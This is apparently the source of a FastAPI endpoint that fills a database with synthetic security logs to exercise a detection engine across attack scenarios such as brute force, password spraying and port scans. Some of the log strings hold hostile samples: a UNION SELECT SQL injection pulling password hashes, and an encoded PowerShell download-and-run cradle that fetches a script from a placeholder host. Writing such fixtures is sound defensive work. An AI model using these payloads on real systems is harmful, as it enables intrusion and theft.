from datetime import datetime, timedelta
from typing import Dict, Any
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.orm import Session
from app.database.session import get_db
from app.models.models import SecurityLog
from app.schemas.schemas import SimulationRequest
from app.detection.engine import evaluate_log_and_generate_alerts

router = APIRouter(prefix="/simulations", tags=["Simulations"])

@router.post("/trigger")
def trigger_simulation(sim_in: SimulationRequest, db: Session = Depends(get_db)) -> Dict[str, Any]:
    attack_type = sim_in.attack_type.lower()
    source_ip = sim_in.source_ip or "185.220.101.5"
    target_user = sim_in.target_user or "admin"
    
    generated_logs = []
    generated_alerts = []
    now = datetime.utcnow()

    if attack_type == "brute_force":
        for i in range(sim_in.count or 6):
            log = SecurityLog(
                timestamp=now - timedelta(seconds=(6 - i) * 5),
                source_ip=source_ip,
                destination_ip="10.0.0.15",
                source_port=51234 + i,
                destination_port=22,
                protocol="SSH",
                event_type="authentication",
                username=target_user,
                hostname="auth-srv-01",
                action="login",
                status="failed",
                message=f"SSH authentication failed for user {target_user} from {source_ip}",
                raw_log=f"Aug 27 {now.strftime('%H:%M:%S')} auth-srv-01 sshd[{12300+i}]: Failed password for {target_user} from {source_ip} port {51234+i} ssh2",
                severity="MEDIUM"
            )
            db.add(log)
            db.commit()
            db.refresh(log)
            generated_logs.append(log.id)
            alerts = evaluate_log_and_generate_alerts(db, log)
            generated_alerts.extend(alerts)

    elif attack_type == "password_spray":
        target_users = ["admin", "root", "dev_lead", "analyst", "finance_dir", "hr_manager"]
        for i, usr in enumerate(target_users):
            log = SecurityLog(
                timestamp=now - timedelta(seconds=(len(target_users) - i) * 10),
                source_ip=source_ip,
                destination_ip="10.0.0.20",
                source_port=44000 + i,
                destination_port=443,
                protocol="HTTPS",
                event_type="authentication",
                username=usr,
                hostname="idp-srv-01",
                action="login",
                status="failed",
                message=f"Single password failure for user {usr} via SSO portal",
                raw_log=f"Aug 27 {now.strftime('%H:%M:%S')} idp-srv-01 sso: User {usr} authentication failed from {source_ip}",
                severity="MEDIUM"
            )
            db.add(log)
            db.commit()
            db.refresh(log)
            generated_logs.append(log.id)
            alerts = evaluate_log_and_generate_alerts(db, log)
            generated_alerts.extend(alerts)

    elif attack_type == "port_scan":
        target_ports = [21, 22, 23, 25, 80, 110, 443, 1433, 3306, 3389, 8080, 8443]
        for i, port in enumerate(target_ports):
            log = SecurityLog(
                timestamp=now - timedelta(seconds=(len(target_ports) - i) * 2),
                source_ip=source_ip,
                destination_ip="10.0.0.50",
                source_port=60000 + i,
                destination_port=port,
                protocol="TCP",
                event_type="firewall",
                username=None,
                hostname="edge-fw-01",
                action="block",
                status="blocked",
                message=f"Firewall blocked TCP connection probe to port {port}",
                raw_log=f"Aug 27 {now.strftime('%H:%M:%S')} edge-fw-01 kernel: [DENY] IN=eth0 OUT= SRC={source_ip} DST=10.0.0.50 DPT={port}",
                severity="LOW"
            )
            db.add(log)
            db.commit()
            db.refresh(log)
            generated_logs.append(log.id)
            alerts = evaluate_log_and_generate_alerts(db, log)
            generated_alerts.extend(alerts)

    elif attack_type == "sqli":
        log = SecurityLog(
            timestamp=now,
            source_ip=source_ip,
            destination_ip="10.0.0.80",
            source_port=58120,
            destination_port=443,
            protocol="HTTPS",
            event_type="web",
            username="anonymous",
            hostname="web-app-prod",
            action="HTTP POST",
            status="suspicious",
            message="Web Application Firewall detected SQL injection signature in GET parameter 'category_id'",
            raw_log=f"GET /products.php?id=1' UNION SELECT username, password_hash FROM users-- HTTP/1.1 Host: shop.company.com User-Agent: sqlmap/1.6.2",
            severity="HIGH"
        )
        db.add(log)
        db.commit()
        db.refresh(log)
        generated_logs.append(log.id)
        alerts = evaluate_log_and_generate_alerts(db, log)
        generated_alerts.extend(alerts)

    elif attack_type == "powershell":
        log = SecurityLog(
            timestamp=now,
            source_ip="10.0.0.105",
            destination_ip=None,
            source_port=None,
            destination_port=None,
            protocol="LOCAL",
            event_type="endpoint",
            username=target_user,
            hostname="WKS-FINANCE-04",
            action="process_launch",
            status="suspicious",
            message="EDR detected powershell process with encoded payload execution",
            raw_log="powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SUVYICgOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL3BheWxvYWQucHMxJyk=",
            severity="HIGH"
        )
        db.add(log)
        db.commit()
        db.refresh(log)
        generated_logs.append(log.id)
        alerts = evaluate_log_and_generate_alerts(db, log)
        generated_alerts.extend(alerts)

    elif attack_type == "priv_esc":
        log = SecurityLog(
            timestamp=now,
            source_ip="10.0.0.112",
            destination_ip=None,
            source_port=None,
            destination_port=None,
            protocol="LOCAL",
            event_type="endpoint",
            username=target_user,
            hostname="SRV-DB-02",
            action="privilege_grant",
            status="suspicious",
            message=f"User {target_user} assigned to local Administrators group via net localgroup command",
            raw_log=f"Aug 27 {now.strftime('%H:%M:%S')} Security 4728: A member was added to a security-enabled global group. Member: CN={target_user},OU=Users. Group: Administrators",
            severity="HIGH"
        )
        db.add(log)
        db.commit()
        db.refresh(log)
        generated_logs.append(log.id)
        alerts = evaluate_log_and_generate_alerts(db, log)
        generated_alerts.extend(alerts)

    elif attack_type == "malware":
        log = SecurityLog(
            timestamp=now,
            source_ip="10.0.0.140",
            destination_ip="185.220.101.5",
            source_port=49880,
            destination_port=8443,
            protocol="TCP",
            event_type="endpoint",
            username=target_user,
            hostname="WKS-DEV-09",
            action="malware_detected",
            status="suspicious",
            message="EDR Agent blocked execution of Ransomware.WannaCry.Variant in C:\\Users\\Public\\Downloads\\invoice.pdf.exe",
            raw_log="EDR ALERT: Path=C:\\Users\\Public\\Downloads\\invoice.pdf.exe Hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 Signature=Ransomware.WannaCry.Generic Action=Terminated",
            severity="CRITICAL"
        )
        db.add(log)
        db.commit()
        db.refresh(log)
        generated_logs.append(log.id)
        alerts = evaluate_log_and_generate_alerts(db, log)
        generated_alerts.extend(alerts)

    elif attack_type == "impossible_travel":
        # Log 1: London
        log1 = SecurityLog(
            timestamp=now - timedelta(minutes=2),
            source_ip="185.220.101.5",
            destination_ip="10.0.0.10",
            source_port=52300,
            destination_port=443,
            protocol="HTTPS",
            event_type="authentication",
            username=target_user,
            hostname="vpn-gateway-uk",
            action="login",
            status="success",
            message=f"User {target_user} logged in from London, UK (185.220.101.5)",
            raw_log=f"Aug 27 {now.strftime('%H:%M:%S')} vpn-gateway-uk: Authentication SUCCESS for {target_user} from 185.220.101.5 [London, UK]",
            severity="LOW"
        )
        db.add(log1)
        db.commit()
        db.refresh(log1)
        generated_logs.append(log1.id)

        # Log 2: Tokyo
        log2 = SecurityLog(
            timestamp=now,
            source_ip="103.21.244.2",
            destination_ip="10.0.0.10",
            source_port=54110,
            destination_port=443,
            protocol="HTTPS",
            event_type="authentication",
            username=target_user,
            hostname="vpn-gateway-jp",
            action="login",
            status="success",
            message=f"User {target_user} logged in from Tokyo, Japan (103.21.244.2)",
            raw_log=f"Aug 27 {now.strftime('%H:%M:%S')} vpn-gateway-jp: Authentication SUCCESS for {target_user} from 103.21.244.2 [Tokyo, JP]",
            severity="LOW"
        )
        db.add(log2)
        db.commit()
        db.refresh(log2)
        generated_logs.append(log2.id)

        alerts = evaluate_log_and_generate_alerts(db, log2)
        generated_alerts.extend(alerts)

    else:
        raise HTTPException(status_code=400, detail=f"Unsupported attack simulation type '{attack_type}'")

    return {
        "status": "success",
        "attack_type": attack_type,
        "logs_generated": len(generated_logs),
        "alerts_triggered": len(generated_alerts),
        "alerts": [{"alert_id": a.alert_id, "title": a.title, "severity": a.severity, "risk_score": a.risk_score} for a in generated_alerts]
    }
